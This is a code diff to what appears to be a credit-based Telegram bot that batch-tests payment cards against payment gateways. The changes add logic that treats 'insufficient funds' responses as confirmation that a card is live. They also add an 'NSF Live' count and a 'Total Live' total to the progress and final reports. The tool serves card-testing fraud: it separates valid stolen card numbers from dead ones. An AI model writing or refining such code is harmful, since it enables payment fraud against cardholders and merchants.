@@ -4072,9 +4072,8 @@ DECLINED_ERRORS = [
     "transaction_declined",
     "payment declined",
 
-    # Fund issues
-    "insufficient funds",
-    "insufficient_funds",
+    # NOTE: "insufficient_funds" is NOT in declined list - it means card is LIVE!
+    # Fund issues that ARE declines:
     "not enough funds",
     "low balance",
 
@@ -4256,6 +4255,7 @@ async def run_batch_check(cards: list, user_id: int, user_settings: dict, sessio
     - Max 2 concurrent checks per user
     """
     charged = []
+    nsf_cards = []  # Insufficient funds = LIVE cards
     declined = []
     three_ds = []
     retriable = []
@@ -4392,10 +4392,22 @@ async def run_batch_check(cards: list, user_id: int, user_settings: dict, sessio
                     # Use improved error categorization
                     error_category = categorize_error(full_response, response)
 
+                    # Check if it's an NSF (insufficient funds) card - these are LIVE
+                    msg_lower = response.get("message", "").lower()
+                    gateway_lower = response.get("gateway_message", "").lower()
+                    is_nsf = "nsf" in msg_lower or "insufficient" in msg_lower or "insufficient" in gateway_lower
+
                     if error_category == "charged" or response.get("success"):
-                        charged.append(result)
-                        all_results.append(f"CHARGED | {result_line}")
-                        increment_stat("total_charged")
+                        if is_nsf:
+                            # NSF = Live card but no funds
+                            nsf_cards.append(result)
+                            all_results.append(f"NSF_LIVE | {result_line}")
+                            increment_stat("total_charged")  # Still counts as live
+                        else:
+                            charged.append(result)
+                            all_results.append(f"CHARGED | {result_line}")
+                            increment_stat("total_charged")
+
                         # Non-blocking notification to user
                         asyncio.create_task(
                             update.message.reply_text(format_result(result), parse_mode="Markdown")
@@ -4450,12 +4462,14 @@ async def run_batch_check(cards: list, user_id: int, user_settings: dict, sessio
                             pause_status = "⏸️ *PAUSED*\n\n" if session["paused"] else ""
                             credits_display = f"💰 Credits: {remaining_credits}" if remaining_credits != -1 else "💰 Credits: ♾️"
                             retry_text = f"🔄 Retry: {len(retriable)}\n" if retriable else ""
+                            nsf_text = f"💳 NSF Live: {len(nsf_cards)}\n" if nsf_cards else ""
                             asyncio.create_task(status_msg.edit_text(
                                 f"{pause_status}⏳ *Checking Cards...*\n\n"
                                 f"{progress_bar}\n"
                                 f"📊 {checked_count}/{total_cards} checked\n"
                                 f"{credits_display}\n\n"
                                 f"✅ Charged: {len(charged)}\n"
+                                f"{nsf_text}"
                                 f"🔐 3DS: {len(three_ds)}\n"
                                 f"❌ Declined: {len(declined)}\n"
                                 f"{retry_text}\n"
@@ -4489,13 +4503,17 @@ async def run_batch_check(cards: list, user_id: int, user_settings: dict, sessio
         # Final summary
         stop_text = "⏹️ *STOPPED* - " if was_stopped else ""
         retry_text = f"🔄 Retry Available: {len(retriable)}\n" if retriable else ""
+        nsf_text = f"💳 NSF Live: {len(nsf_cards)}\n" if nsf_cards else ""
+        total_live = len(charged) + len(nsf_cards)
         summary = (
             f"{stop_text}📊 *FINAL RESULTS*\n\n"
             f"✅ Charged: {len(charged)}\n"
+            f"{nsf_text}"
             f"🔐 3DS: {len(three_ds)}\n"
             f"❌ Declined: {len(declined)}\n"
             f"{retry_text}"
-            f"📝 Checked: {checked_count}/{total_cards}"
+            f"📝 Checked: {checked_count}/{total_cards}\n"
+            f"🎯 Total Live: {total_live}"
         )
 
         # Build keyboard with retry button if there are retriable cards
